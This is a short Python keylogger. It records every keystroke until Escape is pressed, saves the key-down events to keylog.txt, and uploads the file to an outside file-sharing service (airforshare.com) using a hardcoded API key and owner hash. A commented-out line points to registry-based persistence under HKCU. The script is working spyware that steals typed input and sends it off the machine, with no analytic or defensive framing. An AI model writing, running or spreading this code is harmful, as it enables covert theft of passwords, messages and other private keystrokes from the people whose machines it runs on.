import keyboard
import os
#test.register_hkcu(app_name="testREG", script_path=os.path.abspath(__file__))
recorded= keyboard.record(until = 'esc')
with open('keylog.txt', 'w') as f:
    for event in recorded:
        if event.event_type==keyboard.KEY_DOWN:
            f.write(f'{event}\n')
f.close()        
        
import requests

url = "https://www.airforshare.com/apiv3/upload.php"

headers = {
    "X-Auth-Token": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

data = {
    "api_key": "webklsjfoi6jge3pgwe0few03",
    "owner_hash": "aBhTWiVnjP"
}

files = {
    "file": ("keylog.txt", open("keylog.txt", "rb"), "text/plain")
}

response = requests.post(url, headers=headers, data=data, files=files)

print(response.text)
